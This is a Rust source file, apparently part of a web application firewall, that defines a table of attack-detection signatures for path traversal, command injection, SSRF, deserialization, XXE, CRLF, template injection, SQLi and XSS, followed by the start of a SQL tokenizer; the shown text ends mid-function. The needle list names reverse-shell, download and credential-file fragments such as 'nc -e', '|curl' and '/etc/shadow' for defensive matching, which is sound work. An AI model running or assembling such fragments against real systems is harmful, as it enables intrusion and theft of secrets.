//! Signature-based detection.
//!
//! Two layers:
//! 1. Aho-Corasick automaton over a built-in needle table — covers literal
//!    payloads (path traversal, SSRF targets, XXE markers, dangerous shell
//!    metacharacters, …) with a single linear scan.
//! 2. libinjection-style detectors for SQL injection and XSS that go beyond
//!    literal matching: they tokenize the input and look for syntactic
//!    patterns that distinguish an attack from innocent text.

use std::fmt;

use aho_corasick::{AhoCorasick, AhoCorasickBuilder};
use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};

use crate::{StackSet, WafLevel};

// ---------------------------------------------------------------------------
// Categories & patterns
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AttackCategory {
    SqlInjection,
    Xss,
    CommandInjection,
    PathTraversal,
    Ssrf,
    Deserialization,
    CrlfInjection,
    Xxe,
    TemplateInjection,
}

impl AttackCategory {
    pub fn as_str(self) -> &'static str {
        match self {
            AttackCategory::SqlInjection => "sqli",
            AttackCategory::Xss => "xss",
            AttackCategory::CommandInjection => "rce",
            AttackCategory::PathTraversal => "lfi",
            AttackCategory::Ssrf => "ssrf",
            AttackCategory::Deserialization => "deser",
            AttackCategory::CrlfInjection => "crlf",
            AttackCategory::Xxe => "xxe",
            AttackCategory::TemplateInjection => "ssti",
        }
    }
}

impl fmt::Display for AttackCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

/// A single detection signature. All metadata is `&'static str` — the table
/// lives in the binary's read-only data, so building an engine never copies
/// pattern identity around, and per-request hits only carry a `u32` index.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SignaturePattern {
    pub id: &'static str,
    pub category: AttackCategory,
    /// 1 (info) … 5 (critical).
    pub severity: u8,
    /// Backend stacks whose runtime actually interprets this payload family.
    /// [`StackSet::GENERIC`] patterns are active for every deployment.
    pub stack: StackSet,
    /// Only loaded into the automaton when the engine runs at
    /// [`WafLevel::Strict`] — needles whose false-positive cost is acceptable
    /// only when operators explicitly asked for maximum coverage.
    pub strict_only: bool,
    pub description: &'static str,
    /// Literal needle registered in the Aho-Corasick automaton.
    pub needle: &'static str,
}

/// A signature match. Deliberately allocation-free: `pattern` is an index
/// resolved against the engine's active table, so a hit is a handful of
/// integers instead of two heap Strings.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SignatureHit {
    /// Index into the engine's active pattern list; resolve metadata via
    /// [`SignatureEngine::pattern`].
    pub pattern: u32,
    pub category: AttackCategory,
    pub severity: u8,
    /// Byte offset where the needle was found.
    pub offset: usize,
    /// Length of the matched needle in bytes.
    pub length: usize,
}

/// Built-in needle table. Patterns are kept short and high-signal so the
/// automaton stays compact and false positives remain rare. Every entry's
/// identity is baked into the binary; building an engine only selects which
/// slices of this table land in its automaton.
fn builtin_patterns() -> Vec<SignaturePattern> {
    let mut v: Vec<SignaturePattern> = Vec::with_capacity(132);
    // Scoped so the closure's mutable borrow of `v` ends before it is moved
    // out below.
    {
        let mut push = |id: &'static str,
                        cat: AttackCategory,
                        sev: u8,
                        desc: &'static str,
                        needle: &'static str| {
            v.push(SignaturePattern {
                id,
                category: cat,
                severity: sev,
                stack: StackSet::GENERIC,
                strict_only: false,
                description: desc,
                needle,
            });
        };

        // ---- Path traversal ----
        push(
            "PT-001",
            AttackCategory::PathTraversal,
            4,
            "directory traversal (../)",
            "../",
        );
        push(
            "PT-002",
            AttackCategory::PathTraversal,
            4,
            "directory traversal (..\\)",
            "..\\",
        );
        push(
            "PT-003",
            AttackCategory::PathTraversal,
            5,
            "etc/passwd access",
            "/etc/passwd",
        );
        push(
            "PT-004",
            AttackCategory::PathTraversal,
            5,
            "etc/shadow access",
            "/etc/shadow",
        );
        push(
            "PT-005",
            AttackCategory::PathTraversal,
            4,
            "proc/self enumeration",
            "/proc/self",
        );
        push(
            "PT-006",
            AttackCategory::PathTraversal,
            4,
            "windows system32 access",
            "windows\\system32",
        );
        push(
            "PT-007",
            AttackCategory::PathTraversal,
            4,
            "windows system32 access (forward slash)",
            "/windows/system32",
        );
        push(
            "PT-008",
            AttackCategory::PathTraversal,
            3,
            "htaccess probe",
            ".htaccess",
        );
        push(
            "PT-009",
            AttackCategory::PathTraversal,
            3,
            "htpasswd probe",
            ".htpasswd",
        );
        push(
            "PT-010",
            AttackCategory::PathTraversal,
            3,
            "web.config probe",
            "web.config",
        );
        push(
            "PT-011",
            AttackCategory::PathTraversal,
            3,
            "boot.ini probe",
            "boot.ini",
        );
        push(
            "PT-012",
            AttackCategory::PathTraversal,
            4,
            "double-encoded traversal",
            "....//",
        );
        // Slash-less variants: Aho-Corasick consumes non-overlapping matches,
        // so a leading "../" can swallow the "/" that PT-003/004/005 need.
        push(
            "PT-013",
            AttackCategory::PathTraversal,
            5,
            "etc/passwd access (no leading slash)",
            "etc/passwd",
        );
        push(
            "PT-014",
            AttackCategory::PathTraversal,
            5,
            "etc/shadow access (no leading slash)",
            "etc/shadow",
        );
        push(
            "PT-015",
            AttackCategory::PathTraversal,
            4,
            "proc/self enumeration (no leading slash)",
            "proc/self",
        );

        // ---- Command injection ----
        push(
            "CI-001",
            AttackCategory::CommandInjection,
            5,
            "command substitution $(whoami)",
            "$(whoami)",
        );
        push(
            "CI-002",
            AttackCategory::CommandInjection,
            5,
            "command substitution $(id)",
            "$(id)",
        );
        push(
            "CI-003",
            AttackCategory::CommandInjection,
            4,
            "backtick command",
            "`id`",
        );
        push(
            "CI-004",
            AttackCategory::CommandInjection,
            4,
            "backtick command (whoami)",
            "`whoami`",
        );
        push(
            "CI-005",
            AttackCategory::CommandInjection,
            4,
            "shell pipe to cat",
            "|cat",
        );
        push(
            "CI-006",
            AttackCategory::CommandInjection,
            4,
            "shell pipe to ls",
            "|ls",
        );
        push(
            "CI-007",
            AttackCategory::CommandInjection,
            4,
            "shell pipe to wget",
            "|wget",
        );
        push(
            "CI-008",
            AttackCategory::CommandInjection,
            4,
            "shell pipe to curl",
            "|curl",
        );
        push(
            "CI-009",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained ls",
            ";ls",
        );
        push(
            "CI-010",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained cat",
            ";cat",
        );
        push(
            "CI-011",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained id",
            ";id",
        );
        push(
            "CI-012",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained wget",
            ";wget",
        );
        push(
            "CI-013",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained curl",
            ";curl",
        );
        push(
            "CI-014",
            AttackCategory::CommandInjection,
            5,
            "&& chained wget",
            "&&wget",
        );
        push(
            "CI-015",
            AttackCategory::CommandInjection,
            5,
            "&& chained curl",
            "&&curl",
        );
        push(
            "CI-016",
            AttackCategory::CommandInjection,
            5,
            "|| chained curl",
            "||curl",
        );
        push(
            "CI-017",
            AttackCategory::CommandInjection,
            5,
            "|| chained wget",
            "||wget",
        );
        push(
            "CI-018",
            AttackCategory::CommandInjection,
            4,
            "IFS variable",
            "${ifs}",
        );
        push(
            "CI-019",
            AttackCategory::CommandInjection,
            5,
            "/bin/sh invocation",
            "/bin/sh",
        );
        push(
            "CI-020",
            AttackCategory::CommandInjection,
            5,
            "/bin/bash invocation",
            "/bin/bash",
        );
        push(
            "CI-021",
            AttackCategory::CommandInjection,
            5,
            "interactive bash",
            "bash -i",
        );
        push(
            "CI-022",
            AttackCategory::CommandInjection,
            5,
            "cmd.exe invocation",
            "cmd.exe",
        );
        push(
            "CI-023",
            AttackCategory::CommandInjection,
            5,
            "powershell invocation",
            "powershell",
        );
        push(
            "CI-024",
            AttackCategory::CommandInjection,
            4,
            "nc reverse shell",
            "nc -e",
        );
        push(
            "CI-025",
            AttackCategory::CommandInjection,
            4,
            "newline before /bin/",
            "\n/bin/",
        );
        push(
            "CI-026",
            AttackCategory::CommandInjection,
            5,
            "python os.system call",
            "os.system",
        );
        push(
            "CI-027",
            AttackCategory::CommandInjection,
            5,
            "python __import__ call",
            "__import__",
        );
        push(
            "CI-028",
            AttackCategory::CommandInjection,
            5,
            "php shell_exec call",
            "shell_exec(",
        );
        push(
            "CI-029",
            AttackCategory::CommandInjection,
            5,
            "php passthru call",
            "passthru(",
        );
        push(
            "CI-030",
            AttackCategory::CommandInjection,
            5,
            "php proc_open call",
            "proc_open(",
        );
        push(
            "CI-031",
            AttackCategory::CommandInjection,
            4,
            "python subprocess call",
            "subprocess.",
        );
        push(
            "CI-032",
            AttackCategory::CommandInjection,
            5,
            "powershell invoke-expression",
            "invoke-expression",
        );
        push(
            "CI-033",
            AttackCategory::CommandInjection,
            4,
            "powershell iex alias",
            "iex (",
        );
        push(
            "CI-034",
            AttackCategory::CommandInjection,
            4,
            "windows cmd /c chain",
            "cmd /c",
        );
        push(
            "CI-035",
            AttackCategory::CommandInjection,
            4,
            "windows cmd.exe /c chain",
            "cmd.exe /c",
        );
        push(
            "CI-036",
            AttackCategory::CommandInjection,
            5,
            "powershell encoded command",
            "powershell -enc",
        );
        push(
            "CI-037",
            AttackCategory::CommandInjection,
            4,
            "C/PHP system() call",
            "system(",
        );

        // ---- SSRF ----
        push(
            "SSRF-001",
            AttackCategory::Ssrf,
            5,
            "AWS metadata endpoint",
            "169.254.169.254",
        );
        push(
            "SSRF-002",
            AttackCategory::Ssrf,
            5,
            "GCP metadata host",
            "metadata.google",
        );
        push(
            "SSRF-003",
            AttackCategory::Ssrf,
            5,
            "AWS task metadata",
            "169.254.170.2",
        );
        push(
            "SSRF-004",
            AttackCategory::Ssrf,
            4,
            "loopback IPv6",
            "[::1]",
        );
        push(
            "SSRF-005",
            AttackCategory::Ssrf,
            4,
            "loopback IPv4",
            "127.0.0.1",
        );
        push(
            "SSRF-006",
            AttackCategory::Ssrf,
            3,
            "wildcard IPv4",
            "0.0.0.0",
        );
        push(
            "SSRF-007",
            AttackCategory::Ssrf,
            4,
            "localhost with port",
            "localhost:",
        );
        push(
            "SSRF-008",
            AttackCategory::Ssrf,
            5,
            "file:// scheme",
            "file://",
        );
        push(
            "SSRF-009",
            AttackCategory::Ssrf,
            5,
            "gopher:// scheme",
            "gopher://",
        );
        push(
            "SSRF-010",
            AttackCategory::Ssrf,
            5,
            "dict:// scheme",
            "dict://",
        );
        push(
            "SSRF-011",
            AttackCategory::Ssrf,
            4,
            "ldap:// scheme",
            "ldap://",
        );
        push(
            "SSRF-012",
            AttackCategory::Ssrf,
            4,
            "ftp:// scheme",
            "ftp://",
        );
        // Loopback / link-local aliases: classic SSRF filters block the
        // literal IP, so probes move to alternative encodings. The encoded
        // forms are unambiguous; the plain names stay non-critical because
        // "localhost" shows up in dev traffic.
        push(
            "SSRF-013",
            AttackCategory::Ssrf,
            4,
            "localhost name",
            "localhost",
        );
        push(
            "SSRF-014",
            AttackCategory::Ssrf,
            4,
            "loopback IPv4",
            "127.0.0.1",
        );
        push(
            "SSRF-015",
            AttackCategory::Ssrf,
            5,
            "hex loopback encoding",
            "0x7f000001",
        );
        push(
            "SSRF-016",
            AttackCategory::Ssrf,
            5,
            "decimal loopback encoding",
            "2130706433",
        );
        push(
            "SSRF-017",
            AttackCategory::Ssrf,
            5,
            "octal loopback encoding",
            "0177.0.0.1",
        );

        // ---- Deserialization ----
        push(
            "DZ-001",
            AttackCategory::Deserialization,
            5,
            "Java serialized stream",
            "aced0005",
        );
        push(
            "DZ-002",
            AttackCategory::Deserialization,
            5,
            "Python __reduce__",
            "__reduce__",
        );
        push(
            "DZ-003",
            AttackCategory::Deserialization,
            5,
            "Node.js prototype pollution",
            "__proto__",
        );
        push(
            "DZ-004",
            AttackCategory::Deserialization,
            4,
            "Python class introspection",
            "__class__",
        );
        push(
            "DZ-005",
            AttackCategory::Deserialization,
            4,
            "PHP magic __wakeup",
            ":__wakeup",
        );
        push(
            "DZ-006",
            AttackCategory::Deserialization,
            4,
            "PHP magic __destruct",
            ":__destruct",
        );
        push(
            "DZ-007",
            AttackCategory::Deserialization,
            4,
            "PHP magic __toString",
            ":__tostring",
        );
        push(
            "DZ-008",
            AttackCategory::Deserialization,
            5,
            "Java Runtime.exec",
            "runtime.exec",
        );
        push(
            "DZ-009",
            AttackCategory::Deserialization,
            5,
            "Java ProcessBuilder",
            "processbuilder",
        );
        push(
            "DZ-010",
            AttackCategory::Deserialization,
            4,
            "PHP unserialize call",
            "unserialize(",
        );
        push(
            "DZ-011",
            AttackCategory::Deserialization,
            4,
            "YAML unsafe_load",
            "yaml.unsafe_load",
        );

        // ---- XXE ----
        // A DOCTYPE alone is boilerplate on every HTML page and benign XML
        // payload — the attack needs an ENTITY (XXE-002+) or a file://
        // SYSTEM id, so the opener itself must not be a critical hit.
        push(
            "XXE-001",
            AttackCategory::Xxe,
            3,
            "DOCTYPE declaration",
            "<!doctype",
        );
        push(
            "XXE-002",
            AttackCategory::Xxe,
            5,
            "ENTITY declaration",
            "<!entity",
        );
        push(
            "XXE-003",
            AttackCategory::Xxe,
            5,
            "SYSTEM file: entity",
            "system \"file:",
        );
        push(
            "XXE-004",
            AttackCategory::Xxe,
            5,
            "SYSTEM file: entity (single-quoted)",
            "system 'file:",
        );
        push(
            "XXE-005",
            AttackCategory::Xxe,
            4,
            "PUBLIC identifier",
            "public \"-//",
        );

        // ---- CRLF ----
        push(
            "CRLF-001",
            AttackCategory::CrlfInjection,
            4,
            "raw CRLF in value",
            "\r\n",
        );
        push(
            "CRLF-002",
            AttackCategory::CrlfInjection,
            4,
            "raw CR in value",
            "\r",
        );
        // Header-name variants: bare "\r\n" cannot be raised to sev 5 (JSON
        // bodies contain many benign CRLFs), but "\r\n" followed by a header
        // name is unambiguous response-splitting intent.
        push(
            "CRLF-003",
            AttackCategory::CrlfInjection,
            5,
            "CRLF before set-cookie header",
            "\r\nset-cookie",
        );
        push(
            "CRLF-004",
            AttackCategory::CrlfInjection,
            5,
            "CRLF before location header",
            "\r\nlocation:",
        );

        // ---- Template injection ----
        push(
            "TI-001",
            AttackCategory::TemplateInjection,
            4,
            "Jinja/Twig double brace",
            "{{",
        );
        push(
            "TI-002",
            AttackCategory::TemplateInjection,
            4,
            "Jinja statement block",
            "{%",
        );
        push(
            "TI-003",
            AttackCategory::TemplateInjection,
            4,
            "EL/Shell expression",
            "${",
        );
        push(
            "TI-004",
            AttackCategory::TemplateInjection,
            4,
            "Ruby/JS template hash",
            "#{",
        );
        push(
            "TI-005",
            AttackCategory::TemplateInjection,
            4,
            "EJS/JSP expression",
            "<%=",
        );
        push(
            "TI-006",
            AttackCategory::TemplateInjection,
            5,
            "Log4Shell JNDI lookup",
            "${jndi:",
        );
        push(
            "TI-007",
            AttackCategory::TemplateInjection,
            5,
            "Jinja self reference",
            "{{self",
        );
        push(
            "TI-008",
            AttackCategory::TemplateInjection,
            5,
            "Jinja config leak",
            "{{config",
        );

        // ---- SQL injection (literal needles; libinjection catches the rest) ----
        push(
            "SQL-001",
            AttackCategory::SqlInjection,
            5,
            "UNION SELECT",
            "union select",
        );
        push(
            "SQL-002",
            AttackCategory::SqlInjection,
            5,
            "UNION ALL SELECT",
            "union all select",
        );
        push(
            "SQL-003",
            AttackCategory::SqlInjection,
            4,
            "SLEEP function",
            "sleep(",
        );
        push(
            "SQL-004",
            AttackCategory::SqlInjection,
            5,
            "BENCHMARK function",
            "benchmark(",
        );
        push(
            "SQL-005",
            AttackCategory::SqlInjection,
            5,
            "pg_sleep function",
            "pg_sleep(",
        );
        push(
            "SQL-006",
            AttackCategory::SqlInjection,
            5,
            "waitfor delay",
            "waitfor delay",
        );
        push(
            "SQL-007",
            AttackCategory::SqlInjection,
            5,
            "load_file function",
            "load_file(",
        );
        push(
            "SQL-008",
            AttackCategory::SqlInjection,
            5,
            "INTO OUTFILE",
            "into outfile",
        );
        push(
            "SQL-009",
            AttackCategory::SqlInjection,
            5,
            "INTO DUMPFILE",
            "into dumpfile",
        );
        push(
            "SQL-010",
            AttackCategory::SqlInjection,
            3,
            "information_schema probe",
            "information_schema",
        );
        push(
            "SQL-011",
            AttackCategory::SqlInjection,
            3,
            "sqlite_master probe",
            "sqlite_master",
        );
        push(
            "SQL-012",
            AttackCategory::SqlInjection,
            3,
            "pg_catalog probe",
            "pg_catalog",
        );
        push(
            "SQL-013",
            AttackCategory::SqlInjection,
            4,
            "group_concat aggregation",
            "group_concat(",
        );
        push(
            "SQL-014",
            AttackCategory::SqlInjection,
            4,
            "concat_ws aggregation",
            "concat_ws(",
        );
        push(
            "SQL-015",
            AttackCategory::SqlInjection,
            4,
            "extractvalue function",
            "extractvalue(",
        );
        push(
            "SQL-016",
            AttackCategory::SqlInjection,
            4,
            "updatexml function",
            "updatexml(",
        );
        push(
            "SQL-017",
            AttackCategory::SqlInjection,
            4,
            "DROP TABLE",
            "drop table",
        );
        push(
            "SQL-018",
            AttackCategory::SqlInjection,
            4,
            "TRUNCATE TABLE",
            "truncate table",
        );
        push(
            "SQL-019",
            AttackCategory::SqlInjection,
            4,
            "exec xp_cmdshell",
            "xp_cmdshell",
        );

        // ---- XSS (literal needles; detect_xss catches structured payloads) ----
        push("XSS-001", AttackCategory::Xss, 5, "<script tag", "<script");
        push(
            "XSS-002",
            AttackCategory::Xss,
            5,
            "</script tag",
            "</script",
        );
        push("XSS-003", AttackCategory::Xss, 4, "<iframe tag", "<iframe");
        push("XSS-004", AttackCategory::Xss, 4, "<object tag", "<object");
        push("XSS-005", AttackCategory::Xss, 4, "<embed tag", "<embed");
        push("XSS-006", AttackCategory::Xss, 4, "<svg tag", "<svg");
        push(
            "XSS-007",
            AttackCategory::Xss,
            5,
            "javascript: URI",
            "javascript:",
        );
        push(
            "XSS-008",
            AttackCategory::Xss,
            5,
            "vbscript: URI",
            "vbscript:",
        );
        push(
            "XSS-009",
            AttackCategory::Xss,
            4,
            "data:text/html URI",
            "data:text/html",
        );
        push(
            "XSS-010",
            AttackCategory::Xss,
            4,
            "onerror handler",
            "onerror=",
        );
        push(
            "XSS-011",
            AttackCategory::Xss,
            4,
            "onload handler",
            "onload=",
        );
        push(
            "XSS-012",
            AttackCategory::Xss,
            4,
            "onmouseover handler",
            "onmouseover=",
        );
        push(
            "XSS-013",
            AttackCategory::Xss,
            4,
            "onclick handler",
            "onclick=",
        );
        push(
            "XSS-014",
            AttackCategory::Xss,
            4,
            "onfocus handler",
            "onfocus=",
        );
        push(
            "XSS-015",
            AttackCategory::Xss,
            3,
            "document.cookie access",
            "document.cookie",
        );
        push(
            "XSS-016",
            AttackCategory::Xss,
            3,
            "window.location assignment",
            "window.location",
        );
        push(
            "XSS-017",
            AttackCategory::Xss,
            4,
            "CSS expression()",
            "expression(",
        );
        push("XSS-018", AttackCategory::Xss, 4, "eval() call", "eval(");
        push("XSS-019", AttackCategory::Xss, 3, "alert() call", "alert(");
    }

    // Stack scoping: deserialization and EL-lookup markers only matter to the
    // runtime that actually parses them. Engines built for a known stack set
    // drop the rest from the automaton; unconfigured deployments (stack set
    // `ALL`) keep everything.
    let stack_for = |id: &str| match id {
        "DZ-001" | "DZ-008" | "DZ-009" | "TI-006" => StackSet::JAVA,
        "DZ-002" | "DZ-004" | "DZ-011" | "TI-007" => StackSet::PYTHON,
        "DZ-005" | "DZ-006" | "DZ-007" | "DZ-010" => StackSet::PHP,
        "DZ-003" => StackSet::NODE,
        _ => StackSet::GENERIC,
    };
    for p in &mut v {
        p.stack = stack_for(p.id);
    }

    // Strict-only additions. These fire in environments where operators
    // explicitly chose coverage over noise: command-substitution starters
    // beyond the always-on `$(whoami)`/`$(id)` pair, and Log4j lookup
    // containers used by obfuscated Log4Shell variants.
    let mut push_strict = |id: &'static str,
                           cat: AttackCategory,
                           sev: u8,
                           stack: StackSet,
                           desc: &'static str,
                           needle: &'static str| {
        v.push(SignaturePattern {
            id,
            category: cat,
            severity: sev,
            stack,
            strict_only: true,
            description: desc,
            needle,
        });
    };
    push_strict(
        "CI-101",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (cat)",
        "$(cat",
    );
    push_strict(
        "CI-102",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (ping)",
        "$(ping",
    );
    push_strict(
        "CI-103",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (curl)",
        "$(curl",
    );
    push_strict(
        "CI-104",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (wget)",
        "$(wget",
    );
    push_strict(
        "CI-105",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (netcat)",
        "$(nc",
    );
    push_strict(
        "CI-106",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (bash)",
        "$(bash",
    );
    push_strict(
        "TI-101",
        AttackCategory::TemplateInjection,
        5,
        StackSet::JAVA,
        "Log4j case-normalization lookup",
        "${lower:",
    );
    push_strict(
        "TI-102",
        AttackCategory::TemplateInjection,
        5,
        StackSet::JAVA,
        "Log4j case-normalization lookup (upper)",
        "${upper:",
    );
    push_strict(
        "TI-103",
        AttackCategory::TemplateInjection,
        5,
        StackSet::JAVA,
        "Log4j environment lookup",
        "${env:",
    );
    push_strict(
        "TI-104",
        AttackCategory::TemplateInjection,
        5,
        StackSet::JAVA,
        "Log4j system-property lookup",
        "${sys:",
    );

    v
}

/// Aho-Corasick automaton over the built-in pattern table.
///
/// The engine holds only the patterns active for its profile (level × stack
/// set) and owns them as `Copy` structs — building one never allocates
/// pattern metadata, and a scan hit is a `u32` index resolved back through
/// [`SignatureEngine::pattern`].
pub struct SignatureEngine {
    aho: AhoCorasick,
    /// Active patterns in automaton-pattern-index order.
    patterns: Vec<SignaturePattern>,
}

impl fmt::Debug for SignatureEngine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("SignatureEngine")
            .field("pattern_count", &self.patterns.len())
            .finish()
    }
}

impl Default for SignatureEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl SignatureEngine {
    /// Build the engine with the full built-in pattern table at the Normal
    /// level. The automaton is constructed once and reused for every request.
    pub fn new() -> Self {
        Self::for_profile(WafLevel::Normal, StackSet::ALL)
    }

    /// Build an engine for a detection level plus backend-stack selection.
    /// Needles belonging to disabled stacks or to the Strict-only set are
    /// never registered in the automaton, so filtering them out saves work on
    /// every request rather than filtering hits afterwards.
    pub fn for_profile(level: WafLevel, stacks: StackSet) -> Self {
        let patterns: Vec<SignaturePattern> = builtin_patterns()
            .into_iter()
            .filter(|p| {
                (level.is_strict() || !p.strict_only)
                    && stacks.contains(p.stack)
            })
            .collect();
        let needles: Vec<&str> = patterns.iter().map(|p| p.needle).collect();
        let aho = AhoCorasickBuilder::new()
            // LeftmostLongest matters for needle sets with shared prefixes:
            // under the default Standard semantics the short `${` (TI-003)
            // wins the position and consumes it, so the critical `${jndi:`
            // (TI-006) Log4Shell needle can never fire on a real payload.
            // Longest-match keeps the high-signal needle authoritative.
            .match_kind(aho_corasick::MatchKind::LeftmostLongest)
            .ascii_case_insensitive(true)
            .build(&needles)
            .expect("aho-corasick build cannot fail with valid UTF-8 needles");
        Self { aho, patterns }
    }

    pub fn pattern_count(&self) -> usize {
        self.patterns.len()
    }

    /// Resolve an automaton pattern index to its static metadata.
    pub fn pattern(&self, idx: u32) -> &SignaturePattern {
        &self.patterns[idx as usize]
    }

    pub fn pattern_id(&self, idx: u32) -> &str {
        self.pattern(idx).id
    }

    /// Scan `haystack` into caller-owned buffers, clearing them first. Hot
    /// paths reuse one `hits`/`seen` pair across every value of a request, so
    /// scanning a full request costs a single heap allocation instead of one
    /// per field. Results are de-duplicated by pattern so a payload repeating
    /// the same needle doesn't multiply the score.
    pub fn scan_into(
        &self,
        haystack: &str,
        hits: &mut Vec<SignatureHit>,
        seen: &mut Vec<u32>,
    ) {
        hits.clear();
        seen.clear();
        if haystack.is_empty() {
            return;
        }
        for m in self.aho.find_iter(haystack) {
            let pid = m.pattern().as_u32();
            if seen.contains(&pid) {
                continue;
            }
            seen.push(pid);
            let p = &self.patterns[pid as usize];
            hits.push(SignatureHit {
                pattern: pid,
                category: p.category,
                severity: p.severity,
                offset: m.start(),
                length: m.end() - m.start(),
            });
        }
    }

    /// Scan `haystack` and return every signature that fired.
    pub fn scan(&self, haystack: &str) -> Vec<SignatureHit> {
        let mut hits = Vec::new();
        self.scan_into(haystack, &mut hits, &mut Vec::new());
        hits
    }

    /// Convenience: scan and return only the highest severity hit.
    pub fn scan_top(&self, haystack: &str) -> Option<SignatureHit> {
        self.scan(haystack).into_iter().max_by_key(|h| h.severity)
    }
}

// ---------------------------------------------------------------------------
// libinjection-style SQLi detection
// ---------------------------------------------------------------------------

/// SQL keywords we recognize when fingerprinting input.
const SQL_KEYWORDS: &[&str] = &[
    "select",
    "union",
    "all",
    "distinct",
    "from",
    "where",
    "and",
    "or",
    "not",
    "in",
    "like",
    "between",
    "is",
    "null",
    "having",
    "group",
    "order",
    "by",
    "limit",
    "offset",
    "asc",
    "desc",
    "insert",
    "into",
    "values",
    "update",
    "set",
    "delete",
    "drop",
    "alter",
    "create",
    "truncate",
    "table",
    "database",
    "schema",
    "user",
    "version",
    "current_user",
    "session_user",
    "join",
    "inner",
    "left",
    "right",
    "outer",
    "on",
    "as",
    "case",
    "when",
    "then",
    "else",
    "end",
    "exists",
    "any",
    "some",
    "with",
    "recursive",
    "cast",
    "convert",
    "exec",
    "execute",
    "begin",
    "commit",
    "rollback",
    "savepoint",
    "grant",
    "revoke",
    "show",
    "describe",
    "true",
    "false",
];

/// SQL functions that are strong attack indicators on their own.
const SQL_FUNCTIONS: &[&str] = &[
    "sleep",
    "benchmark",
    "waitfor",
    "delay",
    "pg_sleep",
    "load_file",
    "outfile",
    "dumpfile",
    "extractvalue",
    "updatexml",
    "concat",
    "concat_ws",
    "group_concat",
    "char",
    "ascii",
    "ord",
    "hex",
    "unhex",
    "substring",
    "substr",
    "mid",
    "left",
    "right",
    "length",
    "count",
    "sum",
    "avg",
    "min",
    "max",
    "rand",
    "floor",
    "ceil",
    "round",
    "if",
    "ifnull",
    "nullif",
    "coalesce",
    "version",
    "user",
    "database",
    "schema",
    "current_user",
    "session_user",
    "system_user",
    "row_number",
    "rank",
    "dense_rank",
    "xp_cmdshell",
    "sp_executesql",
    "make_set",
    "elt",
    "find_in_set",
    "regexp",
    "rlike",
];

/// Token kinds used to build the SQL fingerprint. Only word-like tokens go
/// through this enum; punctuation, numbers, strings, comments and variables
/// are emitted as raw fingerprint chars directly by [`fingerprint_sql`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SqlTok {
    Keyword,  // k
    Function, // f
    Operator, // t  (logical: AND/OR/XOR/||/&&)
    Ident,    // n
}

impl SqlTok {
    fn fp_char(self) -> char {
        match self {
            SqlTok::Keyword => 'k',
            SqlTok::Function => 'f',
            SqlTok::Operator => 't',
            SqlTok::Ident => 'n',
        }
    }
}

/// Tokenize `lower` (assumed already lower-cased ASCII) into a SQL fingerprint
/// string. The fingerprint mirrors libinjection's single-char-per-token form.
fn fingerprint_sql(lower: &str) -> String {
    let bytes = lower.as_bytes();
    let mut fp = String::with_capacity(bytes.len() / 2 + 4);
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        match b {
            b' ' | b'\t' | b'\n' | b'\r' => i += 1,
            b'\'' | b'"' | b'`' => {
                // String literal: consume until matching quote (allowing backslash escapes).
                let quote = b;
                let mut j = i + 1;
                while j < bytes.len() {
                    if bytes[j] == b'\\' {
                        j += 2;
                        continue;
                    }
                    if bytes[j] == quote {
                        // SQL doubled-quote escape: '' inside a '...' string.
                        if j + 1 < bytes.len() && bytes[j + 1] == quote {
                            j += 2;
                            continue;
                        }
                        break;
                    }
                    j += 1;
                }
                fp.push(if quote == b'`' { 'n' } else { 's' });
                i = (j + 1).min(bytes.len());
            },
            b'-' if i + 1 < bytes.len() && bytes[i + 1] == b'-' => {
                fp.push('-');
                i = bytes.len(); // rest is comment
            },
            b'#' => {
                fp.push('-');
                i = bytes.len();
            },
            b'/' if i + 1 < bytes.len() && bytes[i + 1] == b'*' => {
                fp.push('-');
                // Skip until */
                let mut j = i + 2;
                while j + 1 < bytes.len()
                    && !(bytes[j] == b'*' && bytes[j + 1] == b'/')
                {
                    j += 1;
                }
                i = (j + 2).min(bytes.len());
            },
            b'(' => {
                fp.push('(');
                i += 1;
            },
            b')' => {
                fp.push(')');
                i += 1;
            },
            b',' => {
                fp.push(',');
                i += 1;
            },
            b';' => {
                fp.push(';');
                i += 1;
            },
            b'=' | b'<' | b'>' | b'!' => {
                fp.push('o');
                // Consume multi-char operators (<=, !=, <>, ==).
                let mut j = i + 1;
                while j < bytes.len()
                    && matches!(bytes[j], b'=' | b'<' | b'>' | b'!')
                {
                    j += 1;
                }
                i = j;
            },
            b'+' | b'-' | b'*' | b'/' | b'%' => {
                fp.push('o');
                i += 1;
            },
            b'|' if i + 1 < bytes.len() && bytes[i + 1] == b'|' => {
                fp.push('t');
                i += 2;
            },
            b'&' if i + 1 < bytes.len() && bytes[i + 1] == b'&' => {
                fp.push('t');
                i += 2;
            },
            b'|' | b'&' | b'^' | b'~' => {
                fp.push('o');
                i += 1;
            },
            b'@' => {
                fp.push('v');
                i += 1;
                while i < bytes.len()
                    && (bytes[i].is_ascii_alphanumeric()
                        || bytes[i] == b'_'
                        || bytes[i] == b'@')
                {
                    i += 1;
                }
            },
            b':' if i + 1 < bytes.len()
                && bytes[i + 1].is_ascii_alphabetic() =>
            {
                fp.push('v');
                i += 1;
                while i < bytes.len()
                    && (bytes[i].is_ascii_alphanumeric() || bytes[i] == b'_')
                {
                    i += 1;
                }
            },
